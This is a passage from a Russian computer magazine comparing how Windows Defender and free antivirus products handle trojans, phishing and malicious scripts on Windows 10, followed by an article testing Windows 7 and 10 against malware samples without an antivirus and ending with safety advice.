зловреды. На одном из сайтов в рубрику About ведет ссылка вида /readme.eml.
По ней в браузере беспрепятственно открывается зараженное письмо и про-
исходит активация почтового червя Runouce.b (Chir.B). Однако его попытка по-
лучить контроль над системой проваливается сразу по двум причинам: без до-
полнительных программ Windows 10 не может открыть такой файл, а при любом
обращении к нему червя успешно блокирует Windows Defender.


                                                             Блокирование
                                                                  почтового червя
Часть предупреждений «Защитника» можно счесть избыточной или вовсе от-
нести к ложноположительным. Встроенные средства безопасности Windows 10
постоянно ругаются на разные «хакерские утилиты», вроде программы для вос-
становления паролей к почте. Если такие утилиты имеют GUI и запускаются явно,
то они определяются как потенциально нежелательные приложения (PUP/PUA),
а если только в консоли или в режиме скрытого запуска — как вредоносные.


                                                               Обнаружение
                                                       PUA





За последние годы выросло число инцидентов, связанных с различными типами
фишинга. Они используются как для целенаправленных атак (spearfishing), так
и просто в расчете на невнимательных пользователей. В нашем тесте Windows
Defender сразу заблокировал открытие недавно появившегося фишингового
сайта при помощи SmartScreen.





  Блокирование
  фишингового
  сайта
Если проигнорировать предупреждение и открыть веб-страницу принудитель-
но, то можно увидеть типичную картину: частично копируется оформление бан-
ковского сайта и отображаются формы для ввода конфиденциальных данных
(включая пароль от почты и пин-код). При этом в адресной строке остается уве-
домление: «Небезопасный сайт». Только пять антивирусов из 67 в онлайн-ска-
нере VirusTotal определили его на тот момент как представляющий угрозу. Хоть
это и не malware, а всего лишь инструмент социального инжиниринга, именно
на эту удочку и попадается сегодня большинство.


                                                             Уведомление
                                                                 о посещении
                                                                 небезопасного
                                                                   сайта





Удивительно, но VBS-троянец не обнаруживался на веб-странице до тех пор,
пока мы не стали вручную смотреть ее код. Только тогда «Защитник Windows»
сообщил нам, что видит и удаляет угрозу. На VirusTotal сайт считали заражен-
ным только четыре службы облачной проверки.


                                                            «Защитник
                                                             Windows»
                                                                   игнорирует
                                                                 троянский VBS
                                                                на веб-странице
Загрузка вредоносного джава-скрипта блокируется «Защитником Windows»
и фильтром SmartScreen далеко не всегда. В нашем тесте по одной из ссылок
запустился Trojan.Redirector. Сперва показалось всплывающее окно, а затем
браузер принудительно перенаправился на сайт с навязчивой рекламой. За-
крыть обычным образом окно с сообщением о «выигрыше» MacBook Pro было
невозможно. Пришлось выгружать Edge через диспетчер задач и чистить си-
стему вручную.





                                   Windows Defender не препятствует JS-троянцам


  Еще один частый сценарий атаки с элементами социального инжинирин-
га — запугивание ложными уведомлениями о вирусной атаке. Они побуждают
действовать быстро и необдуманно. В IE и многих других браузерах фейковые
сообщения легко было стилизовать под системные. Теперь обмануть таким
образом стало сложнее: Edge всегда показывает сообщения сайтов в отдель-
ном окне без элементов оформления и со стандартным заголовком: «Этот сайт
говорит...». Руководствуясь репутационной характеристикой, SmartScreen до-
полнительно отмечает сайт как небезопасный, но из-за всплывающего окна это
происходит в фоне и может остаться незамеченным. После более тщательной
проверки такой сайт могут добавить в черный список, и тогда он перестанет
открываться в Edge вообще.
                                                            Edge отделяет
                                                       всплывающие
                                                           сообщения сайтов
                                                                      от основного кон-
                                                                   тента веб-страниц





До сих пор мы рассматривали реакцию Windows 10 на единичные угрозы,
но беда редко приходит одна. Встречаются и сайты, нафаршированные
разными зловредами. В следующем тесте «Защитник Windows» пропустил
два скриптовых трояна, загружаемых с одной и той же веб-страницы. Один
из них накручивал лайки в Facebook (его работа внешне ничем не проявля-
ется), а другой показывал несколько баннеров в отдельных фреймах. Самое
интересное, что часть из них демонстрировала текст на русском, хотя сам
зараженный сайт адресован вьетнамской аудитории, а хостится вообще
в Мельбурне. Видимо, троянец использует Geo IP и/или считывает языковые
установки в браузере.


                                                            Скриптовые троя-
                                                    ны игнорируются
                                                           пачками
QIHOO 360 TOTAL SECURITY 8.2.0.1120
Антивирус от гонконгской компании Qihu (Qihoo 360) вместе с базами зани-
мает менее 80 Мбайт. При этом в нем реализованы три сигнатурных движка
(QVMII AI, Avira, BitDefender) и облачная проверка. Вдобавок, помимо файло-
вого сканера и резидентного монитора, у него есть песочница и другие совре-
менные компоненты дополнительной защиты. Установка происходит быстро
и не сопровождается показом рекламы. Она появляется потом — уже в самой
панели управления антивирусом, но выглядит как простой список рекомендуе-
мых приложений от партнеров. Интерфейс нам показался удобным и достаточ-
но информативным.





                                      Интерфейс Qihoo 360 TS и реклама в его окне

Подозрительный экзешник Qihoo 360 определяет сразу после скачивания, ча-
сто показывая результат одновременно с предупреждением Edge о низкой
репутационной характеристике файла. Антивирус формулирует фразы в стиле
магистра Йоды, слов иногда порядок меняя в предложениях. Никакого выбо-
ра действий при обнаружении трояна он не предлагает — просто уведомля-
ет об удалении вредоносного объекта. Восстановить его можно при нажатии
кнопки «Больше».
                                                           Моментальное
                                                              удаление трояна
                                                              после его загруз-
                                                            ки с сайта





Абсолютно идентичная реакция наблюдается при попытке загрузить фейко-
вый плеер Adobe Flash и другой троян в ZIP. Qihoo также сканирует многоу-
ровневые архивы и самостоятельно распаковывает для проверки скачанные
архивы RAR.


                                                              Автоматическое
                                                            обнаружение
                                                          и удаление трояна
                                                              в скачанном архи-
                                                              ве
После отключения в Edge фильтра SmartScreen антивирус Qihoo 360 не опре-
делил червя в электронном письме по ссылке /readme.eml. Однако он распоз-
нал его при ручном сканировании этого файла из каталога «Загрузки».


                                                                 Запоздалое
                                                                обнаружение
                                                                     почтового
                                                                  червя





Сообщение о троянском VBS на зараженном сайте Qihoo показал буквально
на долю секунды и тут же скрыл его. Пришлось смотреть лог и объекты каран-
тина, чтобы определить реакцию антивируса.


                                                               Обнаружение
                                                                  VBS-троянца
Вредоносный джава-скрипт Qihoo определил только в кеше Edge, а его актив-
ную копию в самом браузере не заблокировал. В результате нам опять пока-
зали баннер в iframe, а затем и знакомое сообщение о лотерее, в которой мы
снова «выиграли» MacBook Pro.


                                                              Обнаружение
                                                                   JS-троянца
                                                                  в кеше Edge





Реакция на фишинговые сайты у Qihoo отличается от других антивирусов. Вме-
сто посещения подозрительной ссылки браузер перенаправляется на уведом-
ление о низкой репутации этого сайта. Оно загружается из облака 360safe.com
и постоянно обновляется. Дополнительно в сообщении указывается реальный
адрес официального сайта PayPal. Он отображается независимо от того, какую
платежную систему или банк имитировали на фишинговой странице.


                                                                Блокирова-
                                                               ние открытия
                                                              фишингового
                                                                     сайта
При переходе на PayPal автоматически запускается элемент «Безопасные пла-
тежи» и выполняется быстрое сканирование системного окружения.


                                                               Проверка
                                                               системы для
                                                           повышения
                                                                   безопасности
                                                               платежей





Двух троянов в разных скриптах одной веб-страницы Qihoo пропустил. Позже
один из них был найден антивирусом в кеше браузера и удален оттуда вместе
с копией веб-страницы. Реакция на сочетанные угрозы оказалась примерно
такой же, как у «Защитника Windows», но тут примечательно другое. Если Qihoo
обнаруживает несколько вредоносных объектов подряд, то появляется реко-
мендация выполнить быструю проверку системы.


                                                               Реакция
                                                                 на множе-
                                                                ственные
                                                                   угрозы
На чистой Windows 10 такая проверка заняла чуть больше трех минут. При этом
просканировались все запущенные процессы, объекты автозапуска и основ-
ные компоненты Windows\system32\ — всего более 21 тысячи файлов.
  Под конец теста Qihoo пропустил зараженный PHP-скрипт с сайта, нахо-
дящегося в черном списке восьми служб облачного мониторинга. Сам скрипт
идентифицируется как Trojan.Obfuscator или Trojan.Crypt большинством анти-
вирусов на VirusTotal — 33 из 55.





                                              Провал на проверке PHP-скрипта


COMODO INTERNET SECURITY 8.2.0.4792
CIS — комплексный продукт, доступный бесплатно для домашних пользовате-
лей и учебных заведений. В его состав входит антивирус, файрвол, песочница
и компоненты проактивной защиты. После установки он занимает более 215
Мбайт вместе с базами. Сама установка происходит буквально в пару кликов,
а вот обновление сигнатур занимает минут десять. Во всяком случае, в первый
раз. Реклама других продуктов Comodo появляется после перезагрузки (ее
можно убрать) и периодически демонстрируется в самой панели управления.
  На подозрительный исполняемый файл Comodo реагирует интереснее дру-
гих антивирусов: он предупреждает об отсутствии у экзешника цифровой под-
писи и предлагает запустить его в песочнице или добавить в список исключе-
ний, помимо стандартных вариантов разрешить/заблокировать.
  Возможность запу-
  стить подозрительный
  файл в песочнице


При обнаружении в списке загрузок трояна, маскирующегося под Adobe Flash
Player, Comodo зачем-то предлагает получить помощь эксперта по телефону
горячей линии.





  Предложение техпод-
  держки при обнаруже-
  нии трояна
Выбор варианта «Нет, я попробую самостоятельно» приводит к простой де-
монстрации уведомления об удалении вредоносного объекта. Наверное, ана-
логичная рекомендация звучит более авторитетно, если ее высказывает «сер-
тифицированный Microsoft специалист».


                                                             Ликвидация
                                                                   трояна
                                                                  в загрузках





В настройках по умолчанию Comodo самостоятельно не сканирует загружен-
ные архивы, даже ZIP. Однако во время их принудительной проверки находит
спрятанную внутри заразу. Архивы RAR он также сканирует лишь при проверке
по запросу.


                                                               Проверка
                                                                   скачанного
                                                                  архива по за-
                                                                    просу
При просмотре страницы /readme.eml, зараженной почтовым червем, Comodo
молчит, поскольку ее теперь блокирует фильтр SmartScreen (в ходе теста об-
новилась репутация веб-сайта). Если отключить SmartScreen, то червь беспре-
пятственно сохраняется в каталоге «Загрузки».





                               Игнорирование почтового червя при посещении сайта


Во время принудительной проверки readme.eml как файла CIS распознает
угрозу.





                               Распознавание почтового червя при ручной проверке


CIS счел безопасным странный экзешник без цифровой подписи и с иконкой
MS Word. Восемь других антивирусов с ним не согласились — они увидели
в подозрительном файле трояна-банкера. Хотя сканер Comodo пропустил эту
угрозу при сигнатурном анализе, во время запуска зараженного файла троян
оказался изолирован при помощи песочницы и не смог инфицировать систему.





                                   Изоляция подозрительных файлов в песочнице


Хотя CIS позиционируется как комплексный продукт для защиты от интер-
нет-угроз, в нашем тесте он не отлавливал переходы на фишинговые сайты
при отключенном фильтре SmartScreen в MS Edge. Может быть, он и умеет это
делать, но мы так и не увидели ни одного предупреждения. Зато при включении
SmartScreen этот фильтр блокировал переход по каждой из них.





                            Comodo разрешает переход по фишинговым ссылкам
Вредоносный скрипт Visual Basic на веб-странице Comodo определил и забло-
кировал сразу при его загрузке.





                           Автоматическое обнаружение VBS-троянца на веб-странице


Однако следом он пропустил пару троянов в джава-скриптах на другом зара-
женном сайте.





                                         Игнорирование JS-троянцев на веб-сайте
PANDA FREE ANTIVIRUS 2016 V.16.1.1
Сразу при установке антивирус Panda предлагает добавить тулбар Yahoo!
и сделать эту службу поиска основной. Затем советует выбрать триальную вер-
сию антивируса Pro вместо загруженного бесплатного. Это настойчивое поже-
лание навсегда останется в главном окне программы, как и окошко, мотивиру-
ющее усилить защиту платными продуктами.
  При первом запуске «Панды» автоматически начинается быстрая провер-
ка системы, а по ее окончании показывается запрос на регистрацию с прось-
бой ввести актуальный email. Этот шаг можно пропустить, а точнее — отложить
на время.
  При попытке включить в настройках файрвол выясняется, что это не установ-
ленный компонент защиты, а очередная рекламная ссылка на версию Pro. Зато
в дополнительных инструментах можно активировать Panda Cloud Cleaner —
отдельный антивирусный сканер с облачной проверкой.
  В ходе первого теста в странном экзешнике без цифровой подписи Panda
сразу распознала зловред, но не сказала какой. Просто моргнула окошком, со-
общив о его удалении. Более подробная информация о найденных угрозах об-
наружилась только в списке объектов на карантине и в логе, ведение которого
сперва надо задать в настройках.





                                                  Панды любят краткость
Обнаружив троян среди загруженных файлов, Panda сначала просто удаляет
его, но потом может запаниковать.
   Если попытаться скачать троян повторно, то антивирус обнаружит его вновь
на том же самом месте и сочтет это признаком активного заражения. Он вы-
даст требование перезагрузить компьютер для избавления от мнимой актив-
ной инфекции и попытается нейтрализовать несуществующие угрозы на ран-
нем этапе загрузки.





                                       Реакция на повторное скачивание троянца


Проверка скачанных архивов ZIP и RAR выполняется только вручную. Panda
находит в них угрозы, но не спешит сообщать детали, видимо руководствуясь
принципом «меньше знаешь — крепче спишь».
                                                            Проверка загру-
                                                        женных архивов
                                                             по запросу





Испанская компания Panda Security называет свой бесплатный антивирус сред-
ством эффективной защиты от фишинговых сайтов и drive-by-угроз. Однако
в нашем тесте даже внесенная в десяток черных списков фишинговая стра-
ница загружается беспрепятственно, мимикрируя под сайт банка. Panda никак
на нее не реагирует при отключении в Edge фильтра SmartScreen.
   Веб-сайт с вредоносным скриптом на Visual Basic антивирус проигнориро-
вал. Он обнаружил и удалил копию зараженной страницы в кеше Edge лишь
тогда, когда мы уже сами делали проверку кеша по запросу.


                                                           Ликвидация
                                                              VBS-троянца
                                                             по запросу
Как и Qihoo 360, Panda позволила загрузить почтового червя (известного с на-
чала 2013 года) по ссылке /readme.eml. Заражение вновь было предотвраще-
но только потому, что свежеустановленная Windows 10 не знает, чем открывать
файлы с таким расширением. Любые манипуляции с файлом readme.eml «Пан-
да» игнорировала. Спохватилась она лишь после того, как мы попросили про-
верить этот файл вручную.





                   Обнаружение почтового червя только при сканировании по запросу


В коде заведомо зараженных веб-страниц Panda не заметила ни одного JS-тро-
яна. Когда мы кликнули по одному из баннеров, внедряемых через iframe, бра-
узер предсказуемо сошел с ума и забросал нас рекламой. Мы специально
закрыли часть окошек и подвигали остальные так, чтобы скрыть наиболее от-
вратные части назойливого маркетинга.
                                                           Игнорирование
                                                              JS-троянцев в коде
                                                              веб-страниц


Конкурентные отношения между разработчиками средств безопасности по-
нятны, но среди всех протестированных продуктов только компоненты автоза-
пуска «Панды» вызывали срабатывание других антивирусных сканеров.





                                      На «Панду» ругаются другие антивирусы
ВЫВОДЫ
Вопреки ожиданиям, Windows Defender v.4.9 оказался вполне рабочим инстру-
ментом защиты. Он интегрирован с другими предустановленными компонента-
ми для повышения безопасности и эффективно противодействует заражению
во время веб-серфинга с использованием нового браузера Edge. Инфициро-
ванные сайты быстро вносятся в черные списки облачной службы Microsoft,
и доступ к ним блокируется независимо от количества и типа обнаруженных
угроз. Переход на многие фишинговые сайты и опасные загрузки блокирует
фильтр SmartScreen. Если что и проскочит, то с большой вероятностью будет
заблокировано «Защитником» или UAC. Кстати, «контроль учетных записей» —
штука хоть и надоедливая, но во время теста не раз выступала последним ру-
бежом обороны.
   Если использование репутационных характеристик сайтов у «Защитника»
и SmartScreen работает отлично, то алгоритмы анализа кода оставляют желать
лучшего. Даже в нулевых годах многие антивирусы лучше определяли вредо-
носные скрипты, чем это сейчас делает Windows Defender. Другой непосиль-
ной задачей для него пока остаются архивы RAR.
   Казалось бы, любой антивирус должен усиливать степень защиты, но на прак-
тике это не так. Все они отключают «Защитник Windows» во избежание кон-
фликтов и не всегда обеспечивают полноценную замену даже ему, не говоря
уже о платных версиях.





                                      Антивирусы отключают «Защитник Windows»
Наиболее приятное впечатление в этот раз произвел Qihoo 360 Total Security
8.2. Легкий дистрибутив, быстрое сканирование, наглядный интерфейс, мини-
мальное количество рекламы, несколько антивирусных движков и актуальные
компоненты дополнительной защиты. При этом он поздно увидел почтового
червя, проигнорировал несколько вредоносных JS- и PHP-скриптов, а на лю-
бом предупреждении о фишинге показывает ссылку PayPal.
   Главным достоинством Comodo можно назвать изолированную среду для за-
пуска потенциально опасного кода. Она реализована очень явно и использу-
ется всеми компонентами CIS. Песочница помогает предотвратить заражение
даже в тех случаях, когда вредоносный объект все-таки запускается. В осталь-
ном этот антивирус почти не радует. Он навязывает техподдержку GeekBuddy
при каждом случае, пропускает на уровне сигнатурного анализа многие крити-
ческие угрозы, заметно тормозит работу системы и даже не препятствует по-
сещению фишинговых сайтов.
   Panda Free стала полным разочарованием. Все вредоносные скрипты из тесто-
вого набора Panda проигнорировала. Часть зловредов она увидела, только когда
ее ткнули в них носом, но вряд ли пользователь будет запускать вручную провер-
ку кеша Edge. Даже сообщения «Панды» не отличаются информативностью, хотя
кому-то это может показаться плюсом. Единственная задача, с которой хорошо
справляется эта программа, — рекламировать свою платную версию.
   Дополнительно мы проверили, как участвовавшие в тесте бесплатные ан-
тивирусы и встроенные средства защиты в Windows 10 определяют заражен-
ные приложения для ОС Android. Краткий ответ — никак. Протрояненные фай-
лы APK они сканируют и обычно определяют как чистые, вводя пользователя
в заблуждение.
MALWARE
КАК Я
ЗАРАЖАЛ
WINDOWS
БЕЗ АНТИВИРУСА: ИСПЫТЫВАЕМ БАЗОВУЮ
УСТОЙЧИВОСТЬ WIN 7 И WIN 10 К МАЛВАРИ





                                      Денис Колисниченко
                                                   dhsilabs@gmail.com
Все мы привыкли к мнению, что без антивиру-
са, а еще лучше Internet Security безопасная жизнь
на винде невозможна. Хочешь обойтись без него —
добро пожаловать на Linux или OS X. А так ли это
на самом деле? Проверим на практике! Подопытных
систем у нас будет две: Windows 7, потому что она
крутая и вообще респект ей, и Windows 10, потому
что ее агрессивно продвигает Microsoft, всегда есть
шанс на нее случайно обновиться :), да и, так или ина-
че, все равно пользователи винды на нее рано или
поздно пересядут.

НАШ ПЛАН
Мы возьмем две чистые системы — Windows 7 SP1 и Windows 10 со всеми по-
следними обновлениями, которые только будут найдены. Стандартные сред-
ства (вроде защитника Windows) будут выключены, сторонние антивирусы —
не установлены. После этого будем открывать инфицированные документы
и проверять улов. Для проверки будет использоваться не требующий установки
сканер от Dr.Web (CureIt) — это гарантия того, что ни один антивирус не будет
запущен в реальном времени.

НАЧИНАЕМ ИЗДАЛЕКА: СТАРЫЕ ВИРУСЫ
Однажды я разбирал свои архивы и очень удивился, когда увидел бурную реак-
цию современного антивируса на старые вирусы и даже asm-файлы. Понятное
дело, что от asm-файлов ничего хорошего ждать не приходится :), но DOS-ов-
ским вирусам-то за что досталось? Простая программистская логика подска-
зывает, что вирусы времен DOS — Windows 98 современной винде не страш-
ны. Но проверим!
  Я достал старый архив Live Viruses 3732 for Anti-Virus Testing и начал их за-
пускать. Ничего не вышло — старые вирусы несовместимы с семеркой. Логика
победила!
                                                 Рис. 1. Старые вирусы не запускаются


Подобный тест в десятке проводить не стану — и так понятен его результат.

Промежуточный вывод
Cтарые вирусы новым системам не страшны. В антивирусных базах современных
защитничков они присутствуют исключительно как балласт и дань традициям.

ПОСЕЩАЕМ НЕБЛАГОНАДЕЖНЫЕ САЙТЫ
Подобно Семену Семеновичу Горбункову, который искал неприятности на свой
гипс, посещая всевозможные места, мы займемся тем же самым, но в вирту-
альном мире. В этом тесте ось будет со всеми апдейтами, в качестве браузе-
ра — Chrome, а вот антивируса не будет.
   Для начала я стану щелкать по всем подряд рекламным баннерам. Chrome
(для большей правдоподобности использую его, а не IE) помогает в обеспе-
чении безопасности — он то и дело закрывает различные всплывающие окна,
в одном из них как раз может быть вирус. URL специально затерт, дабы не де-
лать бесплатной рекламы сайту.
                                                                       Рис. 2. Блоки-
                                                                  ровка всплы-
                                                         вающих окон





Похоже, что от перехода по рекламным баннерам никакой вирус в моей системе
не поселился. Поэтому пришлось искать списки сайтов, явно распространяю-
щих вирусы. И такой список я нашел. Далее все просто: буду заходить на сайты
из списка (не на все, а выборочно) — посмотрим, что из этого выйдет.
   Вот что будет, если браузер направить на сайт, находящийся в «черном спи-
ске». Конечно, я проигнорирую предупреждение и зайду на этот сайт (а как же,
ведь на нем есть интересующий меня контент — вирус). Обычного юзера, понятное
дело, заинтересует другой контент, например серийник для какой-то программы.


                                                                       Рис. 3. Совсем
                                                             уж неблагона-
                                                         дежный сайт
После перехода на сайт всплывающие окна размножаются быстрее, чем кро-
лики (рис. 4). Браузер их блокировал, а я, в свою очередь, снимал блокировку
:). Не знаю, инфицирован компьютер или нет, но Chrome повис намертво. При-
шлось убить процесс. Ура! Троян HTML:Popupper-B оказался сильнее моего
Chrome.





                                               Рис. 4. Размножение всплывающих окон


Интересно, что Chrome ругается не на все вирусы из списка — то ли с опреде-
ленных сайтов был удален вредоносный код, то ли их просто нет в базе Chrome.
Был бы установлен антивирус, можно было бы сказать конкретнее.
Промежуточный вывод
После нескольких часов странствий в интернете я решил оценить улов и запу-
стил сканер CureIt. Увы, все мои старания тщетны (рис. 5). Вирусов не найдено.





                                                                   Рис. 5. Вирусов нет


ПРИЗЫВАЕМ НА ПОМОЩЬ РОДСТВЕННИКОВ
Родственники! Вот по-настоящему надежный источник! Несколько часов я сер-
фил самые подозрительные сайты, пока не вспомнил про компьютер, который
в основном используют жена с дочкой и на котором уже год как не установлен
какой-либо антивирус.
   Загружаю CureIt на него и жду, пока он просканирует все диски. Увы, резуль-
тат такой же. Вирусов нет.

Промежуточный вывод
Родственники не помогли. Малварь пока не поймана.
ПРИЗЫВАЕМ НА ПОМОЩЬ КОЛЛЕГ:
КОЛЛЕКЦИЯ СВЕЖИХ ВИРУСОВ
Я кинул клич — и спустя несколько дней получил отличную подборку современ-
ной малвари (от 0 до 10 лет выдержки): 139 файлов, из них 118 инфицирован-
ных документов (doc и PDF), остальное — EXE.
  В качестве офисного пакета будет использоваться Microsoft Office 2013
SP1 — не самая новая, но и не самая старая версия MS Office. Думаю, что да-
леко не все перешли на 2016, поэтому и рассматривать ее пока нет смысла.
Обрати внимание, что Microsoft Office все-таки отягощен сервис-паком.
   Методика следующая: сначала я буду открывать инфицированные докумен-
ты Word, потом — PDF, а уже потом — EXE. После каждой группы файлов систе-
ма будет проверяться с помощью CureIt (если, конечно, выживет).

Защитник Windows в Windows 10

Прежде чем начну, скажу пару слов о защитнике Windows в десятке. Фича
не новая — она есть и в семерке. Но вот в десятке это, похоже, полноценный
антивирус. Сначала я забыл отключить в Windows 10 встроенный антивирус —
защитник Windows. На удивление он отлично отработал (как выяснилось, в се-
мерке он тоже был включен, но никаких уведомлений от него я не получал),
см. рис. 6 и 7.


                                                                       Рис. 6. Защит-
                                                               ник Windows
                                                               обнаружил
                                                                   вирус
                                                 Рис. 7. Параметры защитника Windows


Потом для чистоты эксперимента пришлось отключить штатный антивирус и за-
ново распаковать архив с вирусами — некоторые антивирус уже успел унич-
тожить. Самое интересное, что после перезагрузки защита снова включает-
ся, хочешь ты этого или нет. Поэтому при написании статьи (когда дело дошло
до EXE-файлов) случился небольшой конфуз. После успешного инфицирования
десятки я запустил CureIt, но он работал настолько медленно (ведь параллельно
оставались запущенными десятки вирусов), что мне пришлось перезагрузить
комп. А после перезагрузки обнаружилось, что вирусов нет. Куда они подева-
лись? Штатный антивирус успел их обезвредить, пока я отлучился от компа.
   После повторного инфицирования пришлось действовать очень быстро
и сразу после загрузки винды выключить антивирус, который включается «до-
бровольно-принудительно». Для тех, кто хочет отключить его полностью, —
нужно отключить его службу.
ДОКУМЕНТЫ MICROSOFT WORD
Инфицировать систему документами Microsoft Word не выйдет, если не вклю-
чать макросы. На рис. 8 показано типичное содержимое такого документа —
мол, контент не виден, пока не включите макросы. По умолчанию выполнение
макросов отключено.





                                             Рис. 8. Открыт инфицированный документ


Что произойдет, если пользователь нажмет кнопку «Включить содержимое»?
На его компьютере поселится вирус. На поверхностный взгляд, конечно, ниче-
го заметно не будет. На рис. 9 еще один пример инфицированного документа.
На этот раз документ предлагает включить редактирование документа и даже
«заботливо» предоставляет необходимые инструкции.
                                  Рис. 9. Еще один вариант инфицированного документа

Некоторые документы совершенно пусты — появляется лишь кнопка «Включить
содержимое». А никакого контента нет. Некоторые вообще не открывались —
при открытии файла выдавало ошибку. Некоторые после нажатия заветной
кнопки отказывались работать в 64-битной системе (рис. 10). Да, на рис. 10 —
это результат открытия все еще документа Word, а не запуска EXE! Несмотря
на то что скрин с семерки, в десятке ситуация такая же.





                                        Рис. 10. В 64-разрядной системе мы не работаем
Итак, я открыл 68 инфицированных документов Word. Удаляю первоначаль-
ную папку с вирусами (чтобы сканер не учитывал «исходный материал») и запу-
скаю CureIt. Спустя некоторое время есть первый улов: в семерке обнаружено
пять угроз (одна из которых даже прописала себя в автозагрузку), а в десятке
найдено три угрозы. Трояны Siggen и Papras отлично себя чувствуют и в новой
операционке. А вот всякая нечисть вроде Adware.OpenCandy в новой системе
не прижилась.
   Если посчитать в процентном соотношении, то получается 8% в Win 7 и чуть
больше 4% в Win 10. Но так определять вероятность инфицирования непра-
вильно. Ведь вирусы имеют свойство размножаться (что будет показано да-
лее) и заражать другие файлы, каждый инфицированный файл будет считать-
ся в CureIt отдельной угрозой. Следовательно, начальных «заразных» файлов,
скажем, может быть десять, а они расплодились до 2000 экземпляров.





                                                       Рис. 11. Пять угроз в Windows 7
                                                      Рис. 12. Три угрозы в Windows 10

Промежуточный вывод
Если не поддаваться на провокации и не нажимать кнопку «Включить содержи-
мое», вероятность становится близкой к нулю. Ведь чтобы инфицировать комп,
нужно выполнить код в виде макроса, а, пока эту кнопку ты не нажмешь, код
не будет выполнен. А раз нажал, то уж пеняй на себя. Также защиту системы
повышает обновление ПО и использование 64-битных версий операционки —
как показывает практика, старые макросы в новых версиях офиса выполняются
с ошибками, а некоторые не могут выполняться в 64-битных системах. Скрины
ошибок не привожу, поскольку их и так будет много в этой статье.

PDF-ДОКУМЕНТЫ
Теперь переходим к PDF-документам. Для открытия PDF в семерке использу-
ется Acrobat Reader DC 2015 — самая последняя версия, загруженная с офи-
циального сайта. В десятке мы будем использовать браузер Edge (он играет
роль просмотрщика PDF).
  На рис. 13 я открыл один из инфицированных PDF-документов в Win 7. Чест-
но говоря, не ожидал такого эффекта. Стоит отметить, что после этого виру-
са Windows загрузилась со второй попытки. Поскольку при повторном откры-
тии этого документа система больше не зависала, можно списать этот случай
на глюки винды — то есть ее нормальное поведение. В Win 10 этот же файл
открылся без происшествий (рис. 14).


                                                                       Рис. 13.
                                                                Открыт инфи-
                                                             цированный
                                                                PDF-файл: та-
                                                                      кого эффекта
                                                                   я не ожидал





                                                                       Рис. 14.
                                                                  Браузер Edge
                                                                  в Windows
                                                                                10: просмотр
                                                                 зараженного
                                                             файла
На рис. 17 инфицированный документ предлагает произвести обновление без-
опасности.





                                            Рис. 15. Часто наблюдалась и такая картина





                   Рис. 16. Попытка открыть сразу с дюжину инфицированных PDF в Win 7
                                       Рис. 17. Произвести обновление безопасности? :)


Что ж, открыты все 50 PDF-документов. Пора проверить систему сканером и по-
смотреть наш улов. Проверка угроз не обнаружила — ни в семерке, ни в де-
сятке. Следовательно, в Win 7 при использовании последней версии Acrobat
Reader вероятность инфицировать свой комп при открытии зараженного фай-
ла минимальна. Что же касается браузера Edge в Win 10, то в нем многие зара-
женные PDF не открылись.

Промежуточный вывод
Инфицированные PDF не пробились через новый Acrobat и Edge.
EXE-ШНИКИ
Теперь самое интересное — буду открывать инфицированные EXE-файлы. Сна-
чала просканирую подборку EXE-файлов (рис. 18), потом запущу их и проверю
комп еще раз — чтобы было понятно, какие вирусы поселились в системе, а ка-
кие нет.





                                                          Рис. 18. Вот такая коллекция


Даже если штатный антивирус отключен или не работает как нужно (в Win 7),
на страже порядка в Windows стоят два средства — UAC и брандмауэр. На рис.
19 показано, что брандмауэр блокировал запуск вируса ipamor, а на рис. 20
UAC защищает систему от Ransom 2.
Рис. 19. По-
скольку бран-
дмауэр не был
отключен, он
срабатывал
на некоторые
вирусы





Рис. 20. Вирус
запрашивает
права админа:
сработал UAC
                                      Рис. 21. Некоторые маскируются под стандартные
                                    инструменты: нужно проявлять бдительность


Опытный или попросту бдительный юзер сразу заподозрит что-то неладное.
Как будут разворачиваться события далее, зависит от юзера: если он заблоки-
рует запуск подозрительной программы (через UAC или брандмауэр), у вируса
ничего не получится. В Win 7 я запретил запуск ipamor, а вот в Win 10 разрешил
ему делать все, что захочется. Результат приведен на рис. 22 и 23.
Рис. 22. Ре-
зультат про-
верки Win 7





Рис. 23. Ре-
зультат про-
верки Win 10
Как видно, вирус ipamor успел хорошо расплодиться по всей системе. А все
потому, что я разрешил ему это сделать. А ведь можно было бы и запретить —
причем для этого не нужен никакой антивирус.
   Что же касается Win 10, то она так же восприимчива к вирусам, как и Win 7.
Можно предположить, что большая часть (ясно, не все) вирусов, которые рабо-
тают в 64-битной семерке, с успехом запустятся в десятке. Упомянутый вирус
ipamor довольно древний — он зверствовал еще в 2006 году, то есть десять лет
назад. Тем не менее он может довольно удачно инфицировать самую совре-
менную версию Windows.
   Думаешь, Win 10 стабильнее? Посмотри на рис. 24 и 25 — как говорится,
найди десять отличий.





                          Рис. 24. Dr.Web занят работой. Вирусы, похоже, тоже. Windows 7
                                                                       Рис. 25.
                                                                  Та же карти-
                                                                              на, но в Win 10





На рис. 26 результат действий одной из вредоносных программ: все докумен-
ты, архивы и некоторые другие файлы переименованы в .MP3. Обратное пере-
именование не помогает — файлы оказываются поврежденными. Ради спра-
ведливости, нужно отметить, что в Windows 7 наблюдалось то же самое.


                                                                       Рис. 26. Ре-
                                                                         зультат дей-
                                                                    ствия вируса.
                                                              Самое инте-
                                                                  ресное в том,
                                                                       что CureIt
                                                                 не видела
                                                            проблемы
                                                                  в этих файлах.
                                                                 Скорее всего,
                                                               они просто
                                                              испорчены
                                                                 вирусом
Промежуточный результат
Запуск EXE-файла малвари с высокой степенью вероятности приведет к зара-
жению системы. Однако даже штатный антивирус, брандмауэр и UAC способны
очень сильно снизить эту вероятность.

Благодарности

Хочу выразить благодарность редактору «Хакера» Александру Лозовскому
за идею этой статьи (как я люблю получать благодарности за свою обычную
работу, ура! — Прим. ред.) и моим анонимным друзьям за присланные семплы
малвари.



А НУЖЕН ЛИ АНТИВИРУС?
В этой статье было показано, как неправильные действия пользователя приве-
ли к инфицированию системы. Если же не пренебрегать стандартными инстру-
ментами системы, не использовать правило Зигзага (нажимать на все кнопки
сразу) и проявлять бдительность по отношению к запускаемым программам
и открываемым файлам/ссылкам, вирусы не так уж и страшны.
   Вот рекомендации, следуя которым ты можешь поддерживать систему в чи-
стоте без (по крайней мере стороннего) антивируса.
1. Обновляй софт. Чем новее ось, браузер, версия офиса, тем меньше вероят-
   ность того, что в новой системе запустятся старые вирусы. Конечно, из всех
   правил есть исключения — бывает, что сами обновления несут в себе ошиб-
   ки и уязвимости. Существуют и «долгоиграющие» вирусы, один из которых
  был показан в статье. Но все равно, вероятность того, что множество старых
   вирусов не запустятся в новой системе, просто огромна.
2. Используй 64-битные системы. Некоторые вирусы отказываются на них за-
   пускаться.
